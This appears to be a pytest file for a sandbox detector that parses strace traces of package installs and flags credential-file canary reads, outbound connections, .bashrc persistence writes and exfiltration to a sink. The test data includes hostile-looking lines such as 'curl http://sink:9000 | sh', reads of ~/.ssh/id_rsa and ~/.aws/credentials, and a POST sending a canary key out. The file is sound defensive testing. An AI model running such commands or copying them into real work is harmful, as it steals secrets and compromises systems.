import json
from pathlib import Path

import pytest

from shadowrun.detector import DetectorConfig, RunContext, analyze
from shadowrun.monitor import parse_trace

FIX = Path(__file__).parent / "fixtures"
CANARIES = ["/home/sandbox/.ssh/id_rsa", "/home/sandbox/.aws/credentials",
            "/home/sandbox/.env", "/home/sandbox/.npmrc"]
TOKEN = "abc123"


def ctx(**kw):
    return RunContext(canary_paths=CANARIES, run_token=TOKEN, **kw)


def rules(trace, **kw):
    pr = parse_trace(trace)
    return {f.rule_id for f in analyze(pr.events, ctx(**kw), DetectorConfig.from_policy())}


def ln(pid, ts, body):
    return f"{pid} {ts} {body}"


def test_canary_read_even_when_open_fails():
    t = ln(7, "1.0", 'openat(AT_FDCWD</work>, "/home/sandbox/.ssh/id_rsa", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)')
    assert rules(t) == {"CANARY_READ"}


def test_decoy_read_is_not_a_finding():
    t = ln(7, "1.0", 'openat(AT_FDCWD</work>, "/home/sandbox/.gitconfig", O_RDONLY) = 3</home/sandbox/.gitconfig>')
    assert rules(t) == set()


def test_relative_path_resolved_against_cwd():
    t = ln(7, "1.0", 'openat(AT_FDCWD</home/sandbox>, ".ssh/id_rsa", O_RDONLY) = 3</home/sandbox/.ssh/id_rsa>')
    assert rules(t) == {"CANARY_READ"}


def test_net_outbound_inet_and_ipv6():
    t = ln(7, "1.0", 'connect(3<socket:[9]>, {sa_family=AF_INET, sin_port=htons(9000), sin_addr=inet_addr("172.19.0.2")}, 16) = -1 EINPROGRESS (Operation now in progress)')
    assert rules(t) == {"NET_OUTBOUND"}
    t6 = ln(7, "1.0", 'connect(3<socket:[9]>, {sa_family=AF_INET6, sin6_port=htons(443), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, "2606:4700::1111", &sin6_addr), sin6_scope_id=0}, 28) = -1 ENETUNREACH (Network is unreachable)')
    assert rules(t6) == {"NET_OUTBOUND"}


def test_loopback_resolver_and_unix_not_flagged():
    t = "\n".join([
        ln(7, "1.0", 'connect(3<socket:[9]>, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, 16) = 0'),
        ln(7, "1.1", 'connect(3<socket:[9]>, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("127.0.0.1")}, 16) = 0'),
        ln(7, "1.2", 'connect(3<socket:[9]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT'),
    ])
    assert rules(t) == set()


def test_persistence_write_bashrc_append():
    t = ln(7, "1.0", 'openat(AT_FDCWD</work>, "/home/sandbox/.bashrc", O_WRONLY|O_CREAT|O_APPEND, 0666) = 3</home/sandbox/.bashrc>')
    assert rules(t) == {"PERSISTENCE_WRITE"}


def test_bashrc_read_only_is_not_persistence():
    t = ln(7, "1.0", 'openat(AT_FDCWD</work>, "/home/sandbox/.bashrc", O_RDONLY) = 3</home/sandbox/.bashrc>')
    assert rules(t) == set()


def test_unexpected_exec_and_allowed_exec():
    t = "\n".join([
        ln(7, "1.0", 'execve("/usr/bin/git", ["git", "rev-parse", "HEAD"], 0x7ff /* 3 vars */) = 0'),
        ln(8, "1.1", 'execve("/usr/bin/curl", ["curl", "http://sink:9000"], 0x7ff /* 3 vars */) = 0'),
    ])
    pr = parse_trace(t)
    f = analyze(pr.events, ctx(), DetectorConfig.from_policy())
    assert [x.rule_id for x in f] == ["UNEXPECTED_EXEC"]
    assert f[0].evidence["path"] == "/usr/bin/curl"


def test_write_outside_allowed():
    t = ln(7, "1.0", 'openat(AT_FDCWD</work>, "/home/sandbox/.hidden", O_WRONLY|O_CREAT, 0666) = 3</home/sandbox/.hidden>')
    assert rules(t) == {"WRITE_OUTSIDE_ALLOWED"}
    ok = ln(7, "1.0", 'openat(AT_FDCWD</work>, "/work/site/x.py", O_WRONLY|O_CREAT, 0666) = 3</work/site/x.py>')
    assert rules(ok) == set()


def test_rename_unlink_mkdir_symlink_are_writes():
    t = "\n".join([
        ln(7, "1.0", 'rename("/tmp/a", "/home/sandbox/.profile") = 0'),
        ln(7, "1.1", 'unlink("/home/sandbox/x") = -1 ENOENT (No such file or directory)'),
        ln(7, "1.2", 'symlink("/etc/passwd", "/home/sandbox/link") = 0'),
    ])
    assert rules(t) == {"PERSISTENCE_WRITE", "WRITE_OUTSIDE_ALLOWED"}


def test_canary_exfil_from_sink_events():
    sink = [{"method": "POST", "path": "/collect", "headers": {}, "body": f"key=CANARY-{TOKEN}-ssh"}]
    f = analyze([], ctx(sink_events=sink), DetectorConfig.from_policy())
    assert [x.rule_id for x in f] == ["CANARY_EXFIL"]
    assert f[0].severity == "critical"
    other = [{"method": "POST", "path": "/", "headers": {}, "body": "CANARY-zzzzzz-ssh"}]
    assert analyze([], ctx(sink_events=other), DetectorConfig.from_policy()) == []


def test_status_rules():
    assert rules("", hash_mismatch=True) == {"HASH_MISMATCH"}
    assert rules("", timed_out=True) == {"SANDBOX_TIMEOUT"}
    assert rules("", install_failed=True) == {"INSTALL_FAILED"}
    assert rules("", install_failed=True, hash_mismatch=True) == {"HASH_MISMATCH"}


def test_unfinished_resumed_merge():
    t = "\n".join([
        ln(7, "1.0", 'openat(AT_FDCWD</work>, "/home/sandbox/.env", O_RDONLY <unfinished ...>'),
        ln(8, "1.1", 'getpid()  = 8'),
        ln(7, "1.2", '<... openat resumed>)  = 3</home/sandbox/.env>'),
    ])
    pr = parse_trace(t)
    assert [e.path for e in pr.events] == ["/home/sandbox/.env"]
    assert rules(t) == {"CANARY_READ"}


def test_cwd_tracking_across_fork_and_chdir():
    # pid 10 forks child 11; child chdirs into the home and writes a relative .bashrc
    t = "\n".join([
        ln(10, "1.0", "clone(child_stack=NULL, flags=CLONE_VM|SIGCHLD) = 11"),
        ln(11, "1.1", 'chdir("/home/sandbox") = 0'),
        ln(11, "1.2", 'openat(AT_FDCWD</home/sandbox>, ".bashrc", O_WRONLY|O_APPEND) = 3</home/sandbox/.bashrc>'),
        ln(11, "1.3", 'mkdir("sub", 0777) = 0'),
    ])
    pr = parse_trace(t)
    assert [e.path for e in pr.events] == ["/home/sandbox/.bashrc", "/home/sandbox/sub"]
    assert rules(t) == {"PERSISTENCE_WRITE", "WRITE_OUTSIDE_ALLOWED"}


def test_relative_write_defaults_to_work_and_is_allowed():
    assert rules(ln(7, "1.0", 'mkdir("build", 0777) = 0')) == set()
    assert rules(ln(7, "1.0", 'mkdir("../home/sandbox/x", 0777) = 0')) == {"WRITE_OUTSIDE_ALLOWED"}


def test_garbage_does_not_crash():
    pr = parse_trace("garbage\n\n12 notafloat blah\n7 1.0 openat(\n+++ exited with 0 +++")
    assert pr.parse_warnings >= 1


@pytest.mark.parametrize("name", ["pip_wheel", "pip_sdist"])
def test_pip_baseline_has_zero_findings(name):
    pr = parse_trace((FIX / f"{name}.trace.log").read_text(), final_exec="cat")
    assert len(pr.events) > 50
    assert pr.parse_warnings == 0 and pr.completeness_problems() == []
    wrapper = (FIX / f"{name}.cmd").read_text()  # the install command the sandbox itself launched via sh -c
    c = ctx()
    c.wrapper_cmd = wrapper
    c.init_pid = pr.final_exec_pid
    findings = analyze(pr.events, c, DetectorConfig.from_policy())
    assert findings == [], [f.message for f in findings]
    assert not [e for e in pr.events if e.kind == "SYSCALL_EVASION"]  # pip itself never needs an evasion syscall


def test_sh_exec_is_exempt_only_for_the_sandbox_own_command():
    own = 'execve("/usr/bin/sh", ["sh", "-c", "printf x && pip install"], 0x7ff /* 3 vars */) = 0'
    evil = 'execve("/usr/bin/sh", ["sh", "-c", "curl http://sink:9000 | sh"], 0x7ff /* 3 vars */) = 0'
    c = ctx()
    c.wrapper_cmd = "printf x && pip install"
    assert analyze(parse_trace(ln(7, "1.0", own)).events, c, DetectorConfig.from_policy()) == []
    f = analyze(parse_trace(ln(7, "1.0", evil)).events, c, DetectorConfig.from_policy())
    assert [x.rule_id for x in f] == ["UNEXPECTED_EXEC"]
    f = analyze(parse_trace(ln(7, "1.0", own)).events, ctx(), DetectorConfig.from_policy())  # no wrapper known
    assert [x.rule_id for x in f] == ["UNEXPECTED_EXEC"]
